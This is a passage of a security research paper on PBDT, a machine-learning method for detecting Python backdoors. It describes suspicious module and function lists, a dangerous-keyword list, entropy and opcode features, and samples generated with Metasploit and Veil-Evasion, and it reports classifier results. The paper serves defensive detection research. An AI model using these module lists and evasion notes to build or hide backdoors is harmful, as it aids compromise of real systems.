encrypt text. In order to\\nachieve this purpose, it is necessary to introduce corre-\\nsponding functional modules and call functions, including\\ncommonly used encryption algorithms “AES,” “RSA,”\\n“base64,”encryptionpadding“padding,”“OAEP,”encoding\\nconversion“binascii,”etc.,whichcanbeusedasdetermining\\na feature of the backdoor ﬁle.\\n3.1.2. Network Communication. A crucial function in the\\nbackdoor is data interaction, including the communication\\nbetween server and client in the C/S backdoor, and webshell\\nuploading or downloading ﬁles from a speciﬁc network\\naddress. Python language implements such functions in-\\ncluding network communication “socket,” “setsockopt,”\\nSSH connection to remote server “paramiko,” “SSHClient,”\\nHTTP request “urllib,” “httplib,” etc. If there is such be-\\nhavior, pay attention.\\n3.1.3. Process Setting. Generally, the process needs to be set\\nwhenthebackdoorisrunning,suchasstartinganewprocess\\nto facilitate subsequent operations, including creating a\\nprocess “subprocess,” multiprocess management “multi-\\nprocessing,” and generating a pseudo-terminal “pty.”\\nConcurrently,toavoiddetectionandobtainpermissions,the\\nprocess may monitor “select,” modify, and obtain the\\nData collection\\nGithub\\nMSF Veil\\nPython\\nBenign\\nBackdoor\\nTraining set\\nBenign\\nBackdoor\\nText processing\\nModule\\nFunction\\nRow\\nAST\\nOpcode\\nText\\nFeature extraction\\nCall features\\n Malicious module feature\\nMalicious function feature \\nLine opcode feature\\nText statistical features \\nInformation entropy\\nLongest string\\nCompression ratio\\nIP/URL\\nIC\\nKeywords\\nOpcode features\\n5-gram + TD-IDF feature\\nFastText malicious judgment\\nfeature\\nModel training and\\nclassiﬁcation\\nRandom forest model\\nBenign Backdoor\\nTesting set\\nFeature set\\nCall features\\nText statistical features \\nOpcode features\\nAll opcode feature\\nTesting set\\nFigure 1: Architecture of PBDT.\\nSecurity and Communication Networks 5\\n 2037, 2021, 1, Downloaded from https://onlinelibrary.wiley.com/doi/10.1155/2021/9923234 by Morocco Hinari NPL, Wiley Online Library on [25/03/2025]. See the Terms and Conditions (https://onlinelibrary.wiley.com/terms-and-conditions) on Wiley Online Library for rules of use; OA articles are governed by the applicable Creative Commons License\\nprocess name “setproctitle”, etc. 'e introduction of above\\nmodule has reason to suspect that it has an attacking intent.\\n3.1.4. File Operation.'ebackdoorwillalsoperformaseries\\nof operations on ﬁles, including polluting local ﬁles, reading\\nand writing system sensitive ﬁles, and replacing common\\nsystem command ﬁles, in order to achieve the purpose of\\nobtaining system permissions. For example, memory read\\nand write “StringIO,” ﬁle copy “shutil,” ﬁle lock “fcntl,” and\\n“exec”familyfunctionsforexecutingﬁles,including“execl,”\\n“execv,” and “execvp.” Although the above modules and\\nfunctions are harmless by themselves, they may cause un-\\ndesirable consequences when used by the backdoor.\\n3.1.5. Command Execution. Executing system commands is\\na common and potentially harmful behavior of backdoors\\nand may be a pivotal step in achieving core functions.\\nSpeciﬁcally, it includes the functions “system,” “command,”\\n“exec_command,”etc., that execute commands. In addition,\\ninteractingwiththecommandlineandparsingparametersis\\nalso a signiﬁcant feature, such as modules “argparse,”\\n“getopt,” “argv,” etc. But normal Python programs may also\\nhave such requirements, so the correct distinction is\\nnecessary.\\n3.1.6. System Control. Controlling the system and\\nobtaining system-related information is the ultimate goal\\nof backdoor execution and an essential manifestation of\\nbackdoor hazards. Such functions include system moni-\\ntoring “psutil,” system hardware’s informationacquisition\\n“wmi,” system operation “platform,” etc. Besides, registry\\noperations “winreg” and virtual memory allocation\\n“VirtualAlloc” are also common behaviors. 'is part also\\nincludes some special functions, such as the module\\n“pynput”thatcontrolsthekeyboardandmouse.'eabove\\ncan be used as a vital basis for judging whether it is a\\nbackdoor.\\n3.2. Text Statistical Features.'e matching of modules and\\nfunctionscansimplyandintuitivelyidentifysomemalicious\\nbehaviors of the backdoor. However, in actual applications,\\nin order to bypass the security control, the backdoor ﬁle is\\nlikely to undergo obfuscation, such as the splicing or\\nencoding of characters, and simple function matching\\ncannotachievethedetectioneﬀect.'eobfuscatedcode text\\nhassometypicalfeatures.Here,fourtypesareselectedasthe\\nﬁnal feature components, and two additional features are\\nadded simultaneously.\\n3.2.1. Information Entropy. 'e concept of information\\nentropy was ﬁrst proposed by Shannon [34] in 1948. It\\nrepresentstheprobabilityofrandomdiscreteeventsandis\\na measure of the system order’s degree. 'e more chaotic\\nthe information, the higher the corresponding entropy.\\n'e method of calculating information entropy is as\\nfollows:\\nT able3: List of common modules and functions of backdoor.\\nModule Function\\nText encryption AES/base64/binascii/hashlib/RSA/\\nCrypto/sha256/hashes/padding/DES\\nb64encode/b64decode/encrypt/decrypt/EncodeAES/DecodeAES/\\nAESGCM/md5/rc4/SHA256/sha1/encode_base64/OAEP/MGF1\\nNetwork\\ncommunication\\nSocket/urllib2/urllib/paramiko/ftplib/\\nSocketServer/httplib Socket/bind/setsockopt/gethostbyname/gethostname/SSHClient\\nProcess setting Subprocess/commands/pty/threading/\\nselect/multiprocessing/setproctitle\\nspawn/Popen/communicate/daemon/fork/'readingTCPServer/\\n'readingUDPServer/setproctitle/Create'read\\nFile operation Shutil/fcntl/StringIO/BytesIO/ctypes/\\nscapy.all Exec/execv/execvp/execﬁle/storbinary\\nCommand\\nexecution\\nArgparse/getopt/getpass/argv/optparse/\\ncmd\\nSystem/getopt/getoutput/tcsetattr/command/exec_command/\\ncheck_output\\nSystem control Platform/winreg/psutil/wmi/pynput VirtualAlloc/sysinfo\\nT able2: Feature summary.\\nFeature set Old features New features and improvements\\nCall features Malicious module feature\\nMalicious function feature\\nLine opcode feature\\nText statistical features Information entropy\\n'e longest string\\nIndex of coincidence\\nCompression ratio\\nIP/URL information\\nDangerous keywords\\nOpcode features All opcode features\\nTF-IDF feature 5-gram\\nFastText feature 5-gram\\n6 Security and Communication Networks\\n 2037, 2021, 1, Downloaded from https://onlinelibrary.wiley.com/doi/10.1155/2021/9923234 by Morocco Hinari NPL, Wiley Online Library on [25/03/2025]. See the Terms and Conditions (https://onlinelibrary.wiley.com/terms-and-conditions) on Wiley Online Library for rules of use; OA articles are governed by the applicable Creative Commons License\\nH(x) � − \\U0010ff58\\nn\\ni�1\\np xi\\x00 \\U0010ff01 log p xi\\x00 \\U0010ff01 \\x00 \\U0010ff01. (1)\\nAmong them, p(xi) represents the probability of a\\nrandom eventxi. When the backdoor performs ﬁle obfus-\\ncation to hide its existence, encryption and encoding will\\ngenerate some random strings, making the information\\nentropy higher. 'erefore, the greater the information en-\\ntropy, the more suspicious the corresponding ﬁle.\\n3.2.2. 1e Longest String. When the code is obfuscated and\\nencoded,itwillgeneratealongstringwithoutspaces,suchas\\nthe classic base64 encoding. Moreover, the introduction of\\nshellcodewillhavethesameeﬀect,whichisnoteasytodetect\\nbecauseofthemaliciousbehaviorhiddeninthehexadecimal\\nmachine code. 'is kind of long string is rarely encountered\\nin regular Python code, so the length of the longest string in\\nthe code can be used to determine the backdoor.\\n3.2.3. Index of Coincidence. Index of coincidence represents\\nthe relative frequency of the letters in sample, that is, the\\nprobability that two letters are the same. 'e concept is\\nwidely used in cryptography related research. 'e calcula-\\ntion method is as follows:\\nIC � \\U0010ff50c\\ni�1 ni ni − 1\\x00 \\U0010ff01\\nN((N − 1)/c). (2)\\nC isthenormalizationcoeﬃcient,whichis26forEnglish\\nletters, ni is the number of times each letter appears in the\\ntext, andN represents its length. Since the encrypted text’s\\nrandomness will increase, the code has a high probability of\\nbeing a backdoor ﬁle after obfuscation operations such as\\nencryption and encoding if the IC value is low.\\n3.2.4. Compression Ratio. In information theory, data\\ncompression is a process of representing information with\\nfewer data bits than the source ﬁle according to a speciﬁc\\nencoding mechanism, which can make the distribution of\\ndata characters tend to be balanced. 'e ratio of after\\ncompressing to before compressing of a ﬁle’s size is called\\nthe compression ratio. In order to achieve the purpose of\\nobfuscation, malicious ﬁles generally have a relatively uni-\\nform character’s distribution after particular encoding, and\\nthe data compression rate is higher than that of ordinary\\nﬁles.Itisreasonabletothinkthatﬁleswithhighcompression\\nrate are backdoors.\\n3.2.5. IP/URL Information. When the backdoor performs\\nnetwork communication, IP or URL is most likely required\\nto indicate the target address, which usually appears in pairs\\nwith data interaction related functions. For example, “bind”\\nbinds the IP and port, “host” parameter indicates the\\ncommunication host, and “connect” connects to the IP\\naddressandalsoincludesinteractionwithaspeciﬁcnetwork\\naddress URL. 'erefore, the total number of IPs or URLs in\\nthe code can be used as a feature of the backdoor.\\n3.2.6. Dangerous Keywords. When developers write back-\\ndoor code, due to their habits or functional needs, they will\\ninclude some backdoor-related words in comments or\\nnamed functions. 'e characters considered here include\\n“shellcode,” “webshell,” “shell,” “backdoor,” “cmd,” “com-\\nmand,” “hack,” and “bypass.” If there are more dangerous\\nkeywords in the code, it is considered as a suspicious\\nbackdoor ﬁle.\\n3.3. Opcode Features. 'e two modules mentioned above\\ncan only identify known malicious behaviors or encoded\\nspecial ﬁles. However, there are various types of backdoors\\nin actual applications. People have limited awareness of\\nmalicious codes, and not all malicious ﬁles will be encoded.\\n'e text’s characteristics of some encoded ﬁles are not\\nprominent. 'erefore, we consider adding opcode features\\nto express Python code through the nature of instructions\\nandcontextualconnectionsrepresentedbytheopcodeitself.\\nOpcodes represent instructions or ﬁelds for performing\\noperationsinacomputerprogram.Itisastepincompilation\\nprocess of Python ﬁles. Compared with the source code, it\\ncan eliminate the inﬂuence of ﬁle obfuscated and ignore the\\ninterference items such as source comments. 'ere are 121\\nopcodes listed in the latest Python3.8 document. 'is paper\\nobtains the sample’s opcode sequence and extracts the\\ncorresponding features through the following three types of\\nprocessing.\\n3.3.1. Statistical Features. 'e functions and processing\\nmethods of backdoor ﬁles are diﬀerent from benign ﬁles, so\\nthe types and numbers of opcodes used may be diﬀerent.\\nFirst, we conduct statistics on each opcode instruction for\\nthe entire text and generate an array with a length of 121 as\\nthe overall opcode statistical feature.\\n'e primary manifestation of the malicious function\\nperformed by the backdoor is malicious functions. If there\\naresuspiciousfunctionsinthebenignﬁle,theopcodesofthe\\ntwo contexts’ execution parameters may be diﬀerent.\\n'erefore, the backdoor ﬁle can be identiﬁed by the opcode\\ncharacteristics of the suspicious function line. Use the lines’\\nnumberofthecodeﬁle’sdangerousfunctionwhenobtaining\\nfunction information through AST. 'en, compile all code\\nlines containing dangerous functions into opcodes sepa-\\nrately, and count the total number of various opcodes.\\nSimilarly,anarrayoflength121isgeneratedasthestatistical\\nfeature of the malicious function line’s opcode.\\n3.3.2. TF-IDF Feature. TF-IDF (term frequency-inverse\\ndocument frequency) is a commonly used weighting tech-\\nnique to evaluate the word’s importance to the entire text\\n[35]. TF represents the frequency of target word in the text.\\nIDF decreases as the number of texts containing a certain\\nphrase increases. It is used to reduce the impact of some\\ncommon phrases in all texts that have little eﬀect on the\\nfunction. 'e two are multiplied to the ﬁnal TF-IDF value.\\n'e calculation formula is as follows:\\nSecurity and Communication Networks 7\\n 2037, 2021, 1, Downloaded from https://onlinelibrary.wiley.com/doi/10.1155/2021/9923234 by Morocco Hinari NPL, Wiley Online Library on [25/03/2025]. See the Terms and Conditions (https://onlinelibrary.wiley.com/terms-and-conditions) on Wiley Online Library for rules of use; OA articles are governed by the applicable Creative Commons License\\ntfi,j �\\nni,j\\n\\U0010ff50knk,j\\n,\\nidfi � lg |D|\\nj: ti ∈dj\\U0010ff6e \\U0010ff6f\\n\\U0010ff0c\\U0010ff0c\\U0010ff0c\\U0010ff0c\\U0010ff0c\\n\\U0010ff0c\\U0010ff0c\\U0010ff0c\\U0010ff0c\\U0010ff0c\\n,\\ntfidfi,j � tfi,j × idfi.\\n(3)\\nAmong them,ni,j refers to the number of occurrences of\\nthe word i in ﬁle j, and the corresponding denominator\\nrepresents the sum of occurrences of all words in ﬁlej. |D|\\nreferstothetotalnumberofsamples,andthecorresponding\\ndenominatorindicatesthenumberofdocumentscontaining\\nthe term i. If the term is not in the document, the de-\\nnominator will be zero. Generally, the denominator will be\\nincreased by one in practical applications. 'e main idea\\napplied here is that if a certain phrase appears more fre-\\nquently in a given sample and rarely appears in other\\nsamples, it is considered that the phrase has a greater class\\ndistinction ability.\\nIn order to obtain the local context information of the\\ntext, on the basis of obtaining the full-text opcode sequence,\\nthen-gramgrammarmodelisused tosegmentthesequence\\nand calculate the frequency. 'e basic idea is to perform a\\nsliding window operation of sizen on the text content in\\nbytestoformasequenceofbytefragmentswithawindowof\\nn. Here, n � 5 is used to balance the completeness of the\\ninformation expressed by opcode and the eﬀect of model\\n(Section 4.3.1). 'e ﬁrst 50 subsequences are selected for\\ncalculation since the amount of information and model\\nperformance is comprehensively measured. 'e word se-\\nquence’s information of the backdoor and benign ﬁles may\\nbe diﬀerent, so the TF-IDF value is calculated according to\\nthe n-gram segmentation result. 'e opcode feature matrix\\nindicating the importance of the phrase is obtained to\\nidentify the backdoor.\\n3.3.3. FastText Malicious Judgment Features. FastText is a\\nword vector representation and fast text classiﬁcation tool\\nopen-sourcedbyFacebookin 2016 [36].Itprovides asimple\\nand eﬃcient method for text classiﬁcation and representa-\\ntion learning. It can achieve accuracy comparable to deep\\nlearning methods but is many orders of magnitude faster\\nthanitstrainingspeed.'elengthoftheopcodesequenceof\\ndiﬀerent ﬁles may be quite inconsistent. 'e ﬁxed-length\\nword vector’s embedding may miss the text’s critical in-\\nformation or do much useless work that consumes multiple\\ncomputing resources. Using the FastText model’s prediction\\nresult as a feature is more suitable for this type of data.\\nFastText has two important optimizations, n-gram and\\nhierarchical softmax. 'e model architecture is shown in\\nFigure 2, wherex1 − xN represent the n-gram vector in the\\ntext, and the average value of word vector is used as the\\nfeature to predict the speciﬁed category. 'e value ofn\\nselected here is the same as the previous module; both are 5.\\nN-gram will keep word order information during model\\ntraining. 'e softmax function is often used as an activation\\nfunction in the neural network’s output layer to normalize\\nthe output value of the neuron to 0-1 interval. Compared\\nwith the standard softmax, which normalizes all categories’\\nprobabilities,hierarchicalsoftmaxconstructsaHuﬀmantree\\nbased on the probability of the category, which can reduce\\nthecomplexityfromNtologNandsigniﬁcantlyimprovethe\\neﬃciencyofmodel.'elabelcategoryoftestsetpredictedby\\nthe FastText model is used as a feature of the backdoor’s\\njudgment.\\n3.4. Classiﬁer. After integrating all the above features, they\\nare sent to the classiﬁer for model training and sample\\ndetection. Here, a Random Forest classiﬁer is selected. 'is\\nclassiﬁer was ﬁrst proposed by Tin Kam Ho of Bell Labo-\\nratories in 1995 [37] and has been widely used since then.\\nRandom Forest is a classiﬁer containing multiple decision\\ntrees,andthemodeofoutputcategoryofasingletreeisused\\nas the ﬁnal output. It uses unbiased estimation. 'e model\\nhas a robust generalization ability, and it is insensitive to\\nmissing or outlier values of features. For unbalanced\\ndatasets, it can reduce errors.\\n'is paper selects several classic machine learning\\nmodels, including XGBoost, Naive Bayes (NB), and Support\\nVector Machine (SVM). Compared with the traditional\\nGBDT algorithm, XGBoost supports column sampling,\\nwhich can not only reduce overﬁtting, but also reduce\\ncalculations. Naive Bayes performs well on small-scale data\\nand has a high speed during training, while SVM has ex-\\ncellent generalization ability. 'e above classiﬁers perform\\nwell in a variety of code classiﬁcation tasks. We conduct\\nperformance comparisons through experiments (Section\\n4.3.3) and ﬁnd that the Random Forest has the best clas-\\nsiﬁcation eﬀect, so we believe this algorithm is suitable for\\nPython backdoor detection.\\n4. Experimental Evaluation\\n'is section will evaluate the eﬀect of PBDT and prove its\\nbeneﬁts through comparative experiments. First, we used\\ntool generation and network collection methods to obtain\\nmore than 2,000 Python samples. After deleting some low-\\nquality data, we labeled them. 'en, we built a model, used\\nexisting data to evaluate its performance, and compared the\\ndetection eﬀects of various modules and common algo-\\nrithms.Finally,wecomparedtheperformanceofPBDTwith\\nsome previous detection methods in similar ﬁelds on this\\ndataset. Experiments show that PBDT has a better dis-\\ntinguishing ability for Python backdoors.\\n...\\nhidden\\noutput\\nx1 x2 xN-1 xN\\nFigure 2: FastText model architecture.\\n8 Security and Communication Networks\\n 2037, 2021, 1, Downloaded from https://onlinelibrary.wiley.com/doi/10.1155/2021/9923234 by Morocco Hinari NPL, Wiley Online Library on [25/03/2025]. See the Terms and Conditions (https://onlinelibrary.wiley.com/terms-and-conditions) on Wiley Online Library for rules of use; OA articles are governed by the applicable Creative Commons License\\n4.1.Dataset. 'ecurrentresearchonmaliciousPythoncode\\nis limited, and there is no relatively comprehensive and\\nauthoritative public dataset. We have extensively collected\\nvarious Python ﬁles from the open-source library GitHub,\\nincluding malicious backdoors and benign codes. Together,\\nsince there are few public backdoor samples, we also used\\nsometoolstogeneratethem.Intheend,1,511whitesamples\\nand 515 black samples were obtained. In each experiment,\\nthey are randomly divided into 70% training set and 30%\\ntesting set to avoid the fortuity of results. 'e primary data\\nsources are shown in Table 4.\\n4.1.1. Backdoor Data. 'e backdoor samples are mainly\\ndivided into three categories:\\n(1) First of all, we collected a wide range of GitHub\\nprojects, including webshells, reverse shells, C/S\\nbackdoors written in Python language, and so on.\\n'e collected ﬁles were marked in the project in-\\ntroduction and veriﬁed by manual inspection to be\\nmalicious.\\n(2) Another part of the samples are generated using\\nMetasploit Framework (MSF), an open-source se-\\ncurity vulnerability detection tool with functions\\nincluding the whole penetration testing process. 'e\\nmsfvenom module can generate Trojan programs.\\nWe have obtained part of the rebound shell through\\nthis tool, includingsome samples encoded by base64\\nor containing shellcode.\\n(3) In actual applications, backdoors are mostly obfus-\\ncated. In order to obtain more comprehensive data,\\nweusetheVeil-Evasionanti-virustool,whichcanbe\\nused to generate Metasploit payloads and bypass\\nstandard software detection or killing. Combining\\nthesetwotools,ahigh-qualitysamplethatcanbypass\\nsecurity controls is obtained.\\n4.1.2. Benign Data. 'e benign samples are all obtained\\nfrom GitHub, including the Python code of various basic\\nfunctions.Toensurethedata’saccuracy,wetrytochoosethe\\nproject with more stars, which shows that the project has a\\nhighdegree ofrecognition.'estandardcode withordinary\\ncommunication function has some functional similarities to\\nthe backdoor, which may cause false positive in practical\\napplications. 'erefore, some samples like this are added to\\nthe benign dataset to ensure the accuracy of ﬁnal training\\nmodel’s classiﬁcation.\\n4.2. Evaluation Index. Choosing appropriate evaluation\\nindicators is the key to the experiment. K-fold cross-vali-\\ndation is a conventional method for model evaluation.\\nGenerally, within a speciﬁc range, the evaluation accuracy\\nwillincreasewiththeKvalueincrease.However,thenumber\\nof datasets in this paper is limited. When the K value is\\nconsiderable, the test samples are small so that the result’s\\nvalidity cannot be guaranteed. 'erefore, for each type of\\nexperimentdescribedbelow,thedatasetisrandomlydivided\\ninto a training set and testing set at a ratio of 7:3 and re-\\npeated ten times at the same time to calculate the average\\nvalue of each indicator. 'is avoids the fortuity of the ex-\\nperimental results and reduces the number of samples’\\nimpact.\\n'is paper is a typical two-category problem. 'e\\nsamplewillbedividedintopositiveandnegative,andthere\\nare four possible results, as shown in the confusion matrix\\nin Table 5. 'e horizontal direction is predicted category,\\nand the vertical direction is actual category. In the matrix,\\nTP (true positive) represents the number of correctly\\nclassiﬁed Python backdoors. FP (false positive) represents\\nthe number of benign samples that are mistaken as\\nbackdoors. TN (true negative) represents the number of\\nbenign samples that are correctly classiﬁed. Furthermore,\\nFN (false negative) indicates the number of backdoor\\nsamples that are mistaken as non-malicious. Based on the\\nconfusion matrix, this paper uses the following evaluation\\nindicators:\\naccuracy � TP+ TN\\nTP+ TN+ FP+ FN,\\nprecision � TP\\nTP+ FP,\\nrecall � TP\\nTP+ FN,\\nTNR � TN\\nFP+ TN,\\nF1 � 2× precision× recall\\nprecision+ recall .\\n(4)\\nIn the above indicators, the accuracy represents the\\nproportion of correctly classiﬁed samples in all samples. 'e\\nprecision represents the probability that the samples pre-\\ndicted to be backdoors are malicious, while the recall rep-\\nresents the proportion of the actual backdoor samples that\\nare correctly predicted (also called TPR, true positive rate).\\nTNR (true negative rate) represents the ratio of correct\\npredictions in actual benign samples, and F1 is the average\\nindex of precision and recall. In addition to the above ﬁve\\nvalues, we also visually compare each algorithm’s perfor-\\nmance by drawing ROC (receiver operating characteristic)\\ncurves (Section 4.3.2).\\nT able4: Statistics from the main sources of data.\\nType Source\\nBenign\\nhttps://github.com/'eAlgorithms/Python\\nhttps://github.com/Lawouach/WebSocket-for-python\\nhttps://github.com/facert/socket-example\\nhttps://github.com/geekcomputers/Python\\nBackdoor\\nMetasploit generation\\nVeil-Evasion+Metasploit generation\\nhttps://github.com/xl7dev/WebShell/tree/master/\\npython\\nhttps://github.com/JustinTom/Packet-Sniﬃng-\\nbackdoor\\nSecurity and Communication Networks 9\\n 2037, 2021, 1, Downloaded from https://onlinelibrary.wiley.com/doi/10.1155/2021/9923234 by Morocco Hinari NPL, Wiley Online Library on [25/03/2025]. See the Terms and Conditions (https://onlinelibrary.wiley.com/terms-and-conditions) on Wiley Online Library for rules of use; OA articles are governed by the applicable Creative Commons License\\n4.3. Basic Experiment. First, we make experimental selec-\\ntions on the value ofn during the two n-gram processing in\\nSection 3.3. At the same time, in order to verify the eﬀec-\\ntiveness of each feature, we select various features indi-\\nvidually or remove them from the full features to evaluate\\nthe capability of the model. In terms of classiﬁer selection,\\nwe compare the commonly used machine learning algo-\\nrithms with the Random Forest used in this paper to ensure\\nthat the optimal algorithm is used. In this section’s exper-\\niments, under the premise of comprehensively considering\\nmodel eﬃciency and detection accuracy, when training the\\nFastText model, the parameter word vector dimension is\\nselected as 30. Meanwhile, the epochs value is 300, and the\\nnumber of decision trees in the Random Forest is set to 100.\\n4.3.1. Reasonability of n in N-gram. Both FastText and TF-\\nIDF in the feature involve the value ofn in n-gram. We\\ndesign experiments to verify the rationality ofn. When n\\ntakes diﬀerent values, a line graph is drawn for the model’s\\naccuracy and recall. 'e results are shown in Figure 3.\\nItisfoundthatbothindicatorsmaintainarelativelyhigh\\nlevel whenn � 5, indicating that the value ofn in the feature\\nis reasonable. When it is lower, it cannot accurately rep-\\nresent the complete sentence information of the Python\\nopcode. When it is higher, the opcode sequence appears too\\nfew times in the code, son � 5 can better represent the\\nPython opcode’s relevant features.\\n4.3.2. Feature Validity. All features are divided into three\\ncategories here. 'e text’s statistical features in Section 3.3.2\\nare relatively simple and cannot accurately represent the\\nsample, so the FastText feature in Section 3.3.3 is added to\\nthis category. Since the opcode feature of the malicious\\nfunction line in Section 3.3.3 is based on the suspicious\\nfunction deﬁned in Section 3.3.1, it is included in the call\\nfeature. 'ree types of call features, text statistics and\\nFastTextfeatures,andfull-textopcodefeaturesareseparately\\nsent to the Random Forest classiﬁer. We simultaneously\\ncombine them for experiments and compare them with all\\nfeatures. 'e experimental results are shown in Table 6.\\nIt can be seen that various features have certain classi-\\nﬁcation eﬀects, but their performance is limited. After re-\\nmoving any type of features, the classiﬁer’s various indicators\\nhave declined, indicating that each feature plays an indis-\\npensable role in training the ﬁnal model. 'e hybrid features\\nproposed in this paper can better identify the Python back-\\ndoor, with an accuracy of 97.70% and a TNR of 98.66%.\\n4.3.3. Classiﬁer Eﬀectiveness. In order to verify the eﬀec-\\ntiveness of the algorithm, some classic machine learning\\nalgorithmsthatarewidelyusedinresearchareselected,and\\nthe comprehensive feature’s training model is used to\\ncompare the performance with the Random Forest clas-\\nsiﬁer. 'e algorithms considered here include XGBoost,\\nNaive Bayes, and Support Vector Machine. In order to\\ncompare the eﬀects of each model more intuitively, the\\nROC curve of each algorithm during the test is drawn, as\\nshown in Figure 4.\\n'e algorithm’s eﬀect can be judged by the graph area’s\\nsize formed by the ROC curve and thex-axis. 'e graph\\nshows that the Random Forest has the best eﬀect, followed\\nby XGBoost, Naive Bayes, and Support Vector Machine.\\n'erefore, it can be considered that the Random Forest\\nclassiﬁer has the best applicability in Python backdoor\\ndetection.\\n4.4. Comparative Experiment. To further illustrate the\\nadvantages of PBDT in detecting Python backdoors,\\nseveral representative models are selected for comparison\\nof experimental data. 'ere are very few previous papers\\nabout Python malicious code detection, so we will use\\nwebshell detection-related methods to reproduce the ex-\\nperiment. Moreover, due to the limited dataset, the deep\\nneural network method may cause overﬁtting and cannot\\nachieve better results, so the classic machine learning\\nmodels are used.\\n0.90\\n0.92\\n0.94\\n0.96Rate\\n234 615\\nThe value of in n_gram\\naccuracy\\nrecall\\nFigure 3: Corresponding indicators for diﬀerent values of n.\\nT able5: Confusion matrix.\\nPredict backdoor Predict benign\\nActual backdoor TP FN\\nActual benign FP TN\\nT able 6: Performance comparison of diﬀerent feature\\ncombinations.\\nFeatures Accuracy Precision Recall\\n(TPR) TNR F1-\\nscore\\n#1 Call 0.9342 0.8805 0.8696 0.9575 0.8750\\n#2 Text 0.9391 0.9026 0.8634 0.9664 0.8825\\n#3 Opcode 0.9441 0.8757 0.9193 0.9530 0.8970\\n#1+#2 0.9589 0.9146 0.9317 0.9687 0.9231\\n#1+#3 0.9638 0.9264 0.9379 0.9732 0.9321\\n#2+#3 0.9473 0.8817 0.9255 0.9553 0.9030\\nPBDT #1+#2+#3 0.9770 0.9623 0.9503 0.9866 0.9563\\n10 Security and Communication Networks\\n 2037, 2021, 1, Downloaded from https://onlinelibrary.wiley.com/doi/10.1155/2021/9923234 by Morocco Hinari NPL, Wiley Online Library on [25/03/2025]. See the Terms and Conditions (https://onlinelibrary.wiley.com/terms-and-conditions) on Wiley Online Library for rules of use; OA articles are governed by the applicable Creative Commons License\\nFang et al. [22] used FastText to detect webshell. 'e\\nmethod is similar to the synthesis of feature 2 and FastText\\nfeaturesinSection4.3.2.'ediﬀerenceisthatthestatistical\\ntextfeatureofcompressionrateisnotconsidered,and n � 4\\nis selected for n-gram value of FastText, whilen � 5 is used\\nin this paper. Cui et al. [18] used Random Forest and\\nGradient Boosting Decision Tree comprehensive algo-\\nrithms to distinguish webshells. 'ey also considered six\\ntypes of text statistical features. Besides, they used TF-IDF\\nand Hash, two types of vectors to represent opcode se-\\nquences, and obtained sequence classiﬁcation labels\\nthrough Random Forest classiﬁers. After synthesizing the\\nﬁrst six types of features, the ﬁnal prediction result was\\nobtained through the GBDT classiﬁer. Unlike this paper,\\nTF-IDF represents the frequency of a single character. Guo\\net al. [38] recognized webshell attacks through opcode and\\nalso used TF-IDF to represent text. However, the bi-gram\\nwas used to divide characters, and the ﬁnal classiﬁer chose\\nNaive Bayes (the method of the paper below is represented\\nby the author’s last name).\\nWe use the dataset of this paper to reproduce the above\\nthree experiments, and compare the performance with\\nPBDT. 'e results are shown in Table 7. It should be noted\\nthat most of the parameter selection in the experiment is\\ndescribed in the original text, but some adjustments are\\nmade due to diﬀerent applicable scenarios. For the part\\nrelated to the text’s statistical characteristics, the ﬁrst two\\npapers are aimed at PHP webshells. 'e dangerous char-\\nactersproposedarealsorelatedtothePHPlanguage.Wewill\\nreplacethemwiththePythonbackdoordangerouskeywords\\nlisted in Section 3.2.6. 'e TF-IDF vector dimension chosen\\nby Cui [18] is 146 because it is for a single character, and\\nthereare146typesofopcodesinPHP.'ereare121typesof\\nPython opcodes in this experiment, so the vector dimension\\nis set to 121.\\n'e table’s data intuitively shows that PBDT is signiﬁ-\\ncantly better than the other three solutions. In-depth\\nanalysis,thealgorithmusedbyGuoetal.[38]isNaiveBayes.\\nIn Section 4.3.3, we have compared the algorithms, and the\\nRandom Forest performs better in the classiﬁcation of Py-\\nthon backdoors. Random Forest is a combination of mul-\\ntiple decision trees with strong generalization ability. At the\\nsame time, the risk of overﬁtting is reduced by averaging\\ndecision trees, and it performs well for the classiﬁcation of\\nhigh-dimensionaldata.'eNaiveBayesmodelassumesthat\\nthe attributes are independent of each other, and the clas-\\nsiﬁcation eﬀect is not good when the number of attributes is\\nrelatively large or the correlation between attributes is rel-\\natively large. 'e classiﬁcation object of this paper is the\\nentire Python ﬁle. File sizes and structures vary greatly.\\nDiﬀerent malicious ﬁles may have diﬀerent manifestations,\\nand the location of suspicious statements in the code is\\nuncertain. At the same time, the feature dimension used is\\nhigher,andtheinternalcorrelationofsimilarfeaturesisalso\\ngreater. 'erefore, compared with the Naive Bayes used by\\nGuo et al. [38], Random Forest is more suitable for the\\nsample scenario in this paper. Simultaneously, the bi-gram\\nonly expresses the relationship between the adjacent opc-\\nodes, and the opcode to express a complete sentence of\\nPythonlanguage needsﬁveormore,sothen � 5used inthis\\npaper can better represent the semantic information of the\\ntext. 'e reason for the signiﬁcantly lower precision of this\\nscheme is the imbalance in the number of positive and\\nnegative samples.\\n'esameistruefortheselectionof n inFangetal.’s[22]\\nFastText model. We have proved through a lot of experi-\\nments thatn � 5 can guarantee the best model performance.\\n'e TF-IDF vector and hash vector in Cui [18] only rep-\\nresentthemappingrelationshipbetweenasingleopcodeand\\nthe vector and do not reﬂect the contextual connection.\\n'erefore, the classiﬁcation eﬀect is not excellent. 'e es-\\nsenceofn-gramistodividethesequenceofopcodesintothe\\nsmallest subblocks that can represent code information. It\\ntakes5ormoretoexpressacompletesentenceofopcodesin\\nthe Python language. For example, for the commonly used\\nsocket connection statement “socket.socket (sock-\\net.AF_INET, socket.SOCK_STREAM)” in the backdoor, the\\ncorresponding opcode sequence is “[“LOAD_NAME”,\\n“LOAD_METHOD”, “LOAD_NAME”,\\n“LOAD_ATTR”, “LOAD_NAME”, “LOAD_ATTR”,\\n“CALL_METHOD”,“RETURN_VALUE”]”.'e numberof\\nopcodes is 8, and the more parameters in the function call,\\nthe longer the sequence length. Consequently, the value ofn\\nROC Curve\\n0.025 0.050 0.075 0.100 0.1750.150 0.2000.000 0.125\\nFalse Positive Rate\\n0.0\\n0.2\\n0.4\\n0.6\\n0.8\\n1.0True Positive Rate\\nNaive Bayes (auc = 0.94)\\nSupport Vector Machine (auc = 0.97)\\nRandom Forest (auc = 0.99)\\nXGboost (auc = 0.98)\\nFigure 4: ROC curves of diﬀerent algorithms.\\nT able7: Performance comparison with other models.\\nAccuracy Precision Recall\\n(TPR) TNR F1-\\nscore\\nGuo et al.\\n[38] 0.8355 0.6393 0.8696 0.8233 0.7368\\nCui [18] 0.9122 0.8961 0.7565 0.9682 0.8201\\nFang et al.\\n[22] 0.9391 0.8563 0.9255 0.9441 0.8896\\nPBDT 0.9770 